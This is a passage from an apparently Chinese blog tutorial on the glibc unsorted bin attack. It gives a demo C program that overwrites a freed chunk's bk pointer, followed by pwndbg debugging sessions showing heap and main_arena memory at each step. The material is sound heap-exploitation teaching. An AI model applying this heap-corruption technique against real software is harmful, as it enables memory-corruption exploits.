%p\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"%p: %p\n"</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br>}<br></code></pre></td></tr></tbody></table></figure><p>大致看一下流程，然后开始进行调试。</p><blockquote><p>编译命令：gcc -g demo.c -o demo</p></blockquote><h3 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h3><p>首先对代码的第12行下断点，开始调试程序：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c">ubuntu@ubuntu:~/Desktop/unsortedbin_demo$ gdb demo<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 192 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from demo...done.<br>pwndbg&gt; b 12<br>Breakpoint 1 at 0x400722: file demo.c, line 12.<br>pwndbg&gt; r<br>Starting program: /home/ubuntu/Desktop/unsortedbin_demo/demo <br>unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 0x7fffffffdd78 的值 0 更改为一个很大的数<br><br><br>Breakpoint 1, <span class="hljs-title function_">main</span> <span class="hljs-params">()</span> at demo.c:12<br>12    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────<br> RAX  <span class="hljs-number">0x51</span><br> RBX  <span class="hljs-number">0x0</span><br> RCX  <span class="hljs-number">0x7ffff7b04380</span> (__write_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br> RDX  <span class="hljs-number">0x7ffff7dd3770</span> (_IO_stdfile_2_lock) ◂— <span class="hljs-number">0x0</span><br> RDI  <span class="hljs-number">0x2</span><br> RSI  <span class="hljs-number">0x7fffffffb6e0</span> ◂— <span class="hljs-number">0x87e5acbbe49188e6</span><br> R8   <span class="hljs-number">0x7ffff7fda700</span> ◂— <span class="hljs-number">0x7ffff7fda700</span><br> R9   <span class="hljs-number">0x51</span><br> R10  <span class="hljs-number">0x0</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x4005b0</span> (_start) ◂— xor    ebp, ebp<br> R13  <span class="hljs-number">0x7fffffffde70</span> ◂— <span class="hljs-number">0x1</span><br> R14  <span class="hljs-number">0x0</span><br> R15  <span class="hljs-number">0x0</span><br> RBP  <span class="hljs-number">0x7fffffffdd90</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br> RSP  <span class="hljs-number">0x7fffffffdd70</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br> RIP  <span class="hljs-number">0x400722</span> (main+<span class="hljs-number">124</span>) ◂— mov    edi, <span class="hljs-number">0x410</span><br>─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────<br> ► <span class="hljs-number">0x400722</span> &lt;main+<span class="hljs-number">124</span>&gt;    mov    edi, <span class="hljs-number">0x410</span><br>   <span class="hljs-number">0x400727</span> &lt;main+<span class="hljs-number">129</span>&gt;    call   <span class="hljs-built_in">malloc</span>@plt &lt;<span class="hljs-built_in">malloc</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40072c</span> &lt;main+<span class="hljs-number">134</span>&gt;    mov    qword ptr [rbp - <span class="hljs-number">0x10</span>], rax<br>   <span class="hljs-number">0x400730</span> &lt;main+<span class="hljs-number">138</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x200929</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400737</span> &lt;main+<span class="hljs-number">145</span>&gt;    mov    rdx, qword ptr [rbp - <span class="hljs-number">0x10</span>]<br>   <span class="hljs-number">0x40073b</span> &lt;main+<span class="hljs-number">149</span>&gt;    mov    esi, <span class="hljs-number">0x400a18</span><br>   <span class="hljs-number">0x400740</span> &lt;main+<span class="hljs-number">154</span>&gt;    mov    rdi, rax<br>   <span class="hljs-number">0x400743</span> &lt;main+<span class="hljs-number">157</span>&gt;    mov    eax, <span class="hljs-number">0</span><br>   <span class="hljs-number">0x400748</span> &lt;main+<span class="hljs-number">162</span>&gt;    call   <span class="hljs-built_in">fprintf</span>@plt &lt;<span class="hljs-built_in">fprintf</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40074d</span> &lt;main+<span class="hljs-number">167</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x20090c</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400754</span> &lt;main+<span class="hljs-number">174</span>&gt;    mov    rcx, rax<br>──────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────<br>In file: /home/ubuntu/Desktop/unsortedbin_demo/demo.c<br>    <span class="hljs-number">7</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n"</span>);<br>    <span class="hljs-number">8</span> <br>    <span class="hljs-number">9</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>   <span class="hljs-number">10</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n"</span>, &amp;stack_var, stack_var);<br>   <span class="hljs-number">11</span> <br> ► <span class="hljs-number">12</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>   <span class="hljs-number">13</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"一开始先申请一个比较正常的 chunk: %p\n"</span>,p);<br>   <span class="hljs-number">14</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再分配一个避免与 top chunk 合并\n\n"</span>);<br>   <span class="hljs-number">15</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br>   <span class="hljs-number">16</span> <br>   <span class="hljs-number">17</span>     <span class="hljs-built_in">free</span>(p);<br>──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0x7fffffffdd70</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0x7fffffffdd78</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0x7fffffffdd80</span> —▸ <span class="hljs-number">0x7fffffffde70</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0x7fffffffdd88</span> ◂— <span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│ rbp  <span class="hljs-number">0x7fffffffdd90</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│      <span class="hljs-number">0x7fffffffdd98</span> —▸ <span class="hljs-number">0x7ffff7a2d840</span> (__libc_start_main+<span class="hljs-number">240</span>) ◂— mov    edi, eax<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0x7fffffffdda0</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0x7fffffffdda8</span> —▸ <span class="hljs-number">0x7fffffffde78</span> —▸ <span class="hljs-number">0x7fffffffe20d</span> ◂— <span class="hljs-string">'/home/ubuntu/Desktop/unsortedbin_demo/demo'</span><br>────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────<br> ► f <span class="hljs-number">0</span>           <span class="hljs-number">400722</span> main+<span class="hljs-number">124</span><br>   f <span class="hljs-number">1</span>     <span class="hljs-number">7f</span>fff7a2d840 __libc_start_main+<span class="hljs-number">240</span><br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>看一下这时的本地变量情况：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x7fffffffde70</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;stack_var<br><span class="hljs-number">0x7fffffffdd78</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007fffffffde70</span><br><span class="hljs-number">0x7fffffffdd88</span>:<span class="hljs-number">0xbfb16d8983641800</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:<span class="hljs-number">0x00007ffff7a2d840</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;p<br><span class="hljs-number">0x7fffffffdd80</span>:<span class="hljs-number">0x00007fffffffde70</span><span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">0x7fffffffdd90</span>:<span class="hljs-number">0x0000000000400870</span><span class="hljs-number">0x00007ffff7a2d840</span><br><span class="hljs-number">0x7fffffffdda0</span>:<span class="hljs-number">0x0000000000000001</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>从上面的代码框可以看到，此时：<br>● stack_var的值为0，此变量的地址为0x7fffffffdd78<br>● p的值为0x7fffffffde70，此变量的地址为0x7fffffffdd80</p><h3 id="执行unsigned-long-p-malloc-0x410"><a href="#执行unsigned-long-p-malloc-0x410" class="headerlink" title="执行unsigned-long-p-malloc-0x410"></a>执行unsigned long *p=malloc(0x410);</h3><p>对代码的第13行下断点，让程序执行：unsigned long *p=malloc(0x410);  继续查看内存：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602420</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x602010</span><br>pwndbg&gt; x/<span class="hljs-number">160</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br><span class="hljs-number">0x602010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0x602420</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020be1</span> #top_chunk<br>......（省略内容均为空）<br><span class="hljs-number">0x6024f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602420</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h3 id="执行malloc-500"><a href="#执行malloc-500" class="headerlink" title="执行malloc-500"></a>执行malloc(500);</h3><p>现在指针p指向malloc_data，紧接着对代码的第17行下断点让程序执行：malloc(500);，继续查看内存：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602620</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena <br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; x/<span class="hljs-number">300</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br>......（省略内容均为空）<br><span class="hljs-number">0x602420</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000201</span> #malloc_chunk1<br>......（省略内容均为空）<br><span class="hljs-number">0x602620</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00000000000209e1</span> #top_chunk<br>......（省略内容均为空）<br><span class="hljs-number">0x602950</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>此处又malloc一个空间是为了避免malloc_chunk1与top_chunk相邻而导致的在free chunk1时不回收到unsortedbin。</p><blockquote><p><strong>释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。</strong></p></blockquote><h3 id="执行free-p"><a href="#执行free-p" class="headerlink" title="执行free-p"></a>执行free(p)</h3><p>对代码的第18行下断点，程序将会执行：free(p);  继续运行程序，查看内存：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span> <span class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x602010</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br>    <span class="hljs-meta">#fd#bk</span><br><span class="hljs-number">0x602020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br>......(省略内容均为空)<br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602620</span> <br> #指向top_chunk<br><span class="hljs-meta">#unsortedbin指向的地方</span><br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602000</span> <br>    <span class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x0000000000602000</span><span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b88</span><span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b98</span><span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:<span class="hljs-number">0x00007ffff7dd1ba8</span><span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bb8</span><span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bc8</span><span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bd8</span><span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:<span class="hljs-number">0x00007ffff7dd1be8</span><span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>在之前的文章中我们说过，当unsortedbin只有一个free_chunk时，它的fd和bk指针都指向unsortedbin本身。</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png'><img src="https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png" alt="Snipaste_2023-09-13_20-40-59.png"></p><h3 id="执行p-1-unsigned-long-stack-var-2"><a href="#执行p-1-unsigned-long-stack-var-2" class="headerlink" title="执行p-1-unsigned-long-stack-var-2"></a>执行p[1]=(unsigned long)(&amp;stack_var-2);</h3><p>对代码第21行下断点，继续：p[1]=(unsigned long)(&amp;stack_var-2);</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x602010</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007fffffffdd68</span><br>    <span class="hljs-meta">#fd#bk被更改</span><br><span class="hljs-number">0x602020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>现在我们已经更改了unsortedbin中malloc_chunk1指针为0x00007fffffffdd68。刚好是刚才申请的 stack_var - 0x10 的位置</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 